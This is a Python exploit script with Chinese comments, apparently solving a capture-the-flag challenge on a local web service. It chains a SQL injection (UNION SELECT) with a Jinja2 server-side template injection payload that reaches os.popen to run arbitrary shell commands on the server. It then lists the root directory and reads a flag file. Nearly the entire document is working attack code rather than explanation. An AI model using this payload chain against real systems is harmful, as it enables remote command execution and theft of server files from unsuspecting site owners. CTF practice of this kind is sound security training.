#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import re
import requests # 使用 requests 库来处理 HTTP 请求

# --- 连接信息 ---
# 注意: 根据你的错误日志，端口已更新为 59994。
# 如果目标程序重启后端口发生变化，请在此处修改为新的端口号。
HOST = '127.0.0.1'
PORT = 59994

# --- 全局变量 ---
# [关键修复] 使用四重花括号来转义，确保 .format() 方法输出双重花括号 {{ ... }}
# 这样 Jinja2 模板引擎才能正确执行它。
SSTI_PAYLOAD_TEMPLATE = "{{{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('{}').read() }}}}"

def execute_command(command):
    """
    通过 SQLi + SSTI 漏洞在服务器上执行命令并返回结果。
    
    Args:
        command (str): 要在远程服务器上执行的 shell 命令。

    Returns:
        str: 命令执行后的输出结果，如果失败则返回 None。
    """
    log.info(f"正在执行命令: {command}")
    
    # 1. 构造 SSTI Payload
    ssti_payload = SSTI_PAYLOAD_TEMPLATE.format(command)
    
    # 2. 为 SQL 查询转义单引号
    # 将 payload 中的每个 ' 替换为 ''，以使其成为有效的 SQL 字符串文字。
    sql_safe_ssti_payload = ssti_payload.replace("'", "''")
    
    # 3. 构造 SQL 注入 Payload
    # 使用 UNION SELECT 将我们转义后的 SSTI payload 作为 username 返回
    sql_payload = f"0 UNION SELECT '{sql_safe_ssti_payload}'"
    
    # 4. 准备请求参数，requests 库会自动处理 URL 编码
    url = f"http://{HOST}:{PORT}/"
    params = {'id': sql_payload}
    
    try:
        # 5. 使用 requests 库发送 GET 请求
        response = requests.get(url, params=params, timeout=15) # 稍微增加超时时间
        response_text = response.text

        # --- 调试步骤: 打印从服务器收到的响应 ---
        log.info("--- 完整的服务器响应 ---")
        print(response_text)
        
        # 6. 检查 HTTP 状态码
        if response.status_code != 200:
            log.error(f"服务器返回了非 200 状态码: {response.status_code}")
            return None
        
        # 7. 解析响应，提取命令输出
        match = re.search(r'<h3>Hello, (.*?) !</h3>', response_text, re.DOTALL)
        if match:
            output = match.group(1).strip()
            if not output:
                log.warning("命令似乎已执行，但没有收到任何输出。")
            else:
                log.success("成功提取命令输出!")

            if "cat" in command:
                print("--- 命令输出 ---\n" + output)
            return output
        else:
            log.error("在响应中未找到预期的 '<h3>Hello, ...</h3>' 格式。")
            return None
            
    except requests.exceptions.RequestException as e:
        log.error(f"使用 requests 库请求时发生错误: {e}")
        return None

def find_and_read_flag():
    """
    主函数，先列出根目录文件，然后读取 flag。
    """
    # 第一步: 列出根目录下的文件，寻找 flag 文件
    log.info("步骤 1: 尝试列出根目录 '/' 的文件...")
    ls_output = execute_command("ls -la /")
    
    if ls_output is None: 
        log.critical("无法执行命令或解析输出，脚本终止。请检查上面的服务器响应以了解原因。")
        return

    # 使用正则表达式在命令输出中查找 flag 文件名
    flag_file_match = re.search(r'flag[\w.-]*', ls_output)
    
    if not flag_file_match:
        log.critical("在根目录输出中未找到 flag 文件。以下是 'ls -la /' 的完整输出:")
        print(ls_output)
        return
        
    flag_filename = flag_file_match.group(0)
    log.success(f"步骤 1 完成: 找到可能的 Flag 文件 -> {flag_filename}")
    
    # 第二步: 读取找到的 flag 文件内容
    log.info(f"步骤 2: 尝试读取文件 '/{flag_filename}'...")
    flag_content = execute_command(f"cat /{flag_filename}")
    
    if flag_content:
        log.success("步骤 2 完成: 成功获取 Flag 内容!")
        print("\n" + "="*40)
        print(f"[*] Flag: {flag_content}")
        print("="*40)
    else:
        log.critical("读取 Flag 文件失败。")

if __name__ == "__main__":
    # 如果尚未安装 requests 库，需要先安装: pip install requests
    find_and_read_flag()
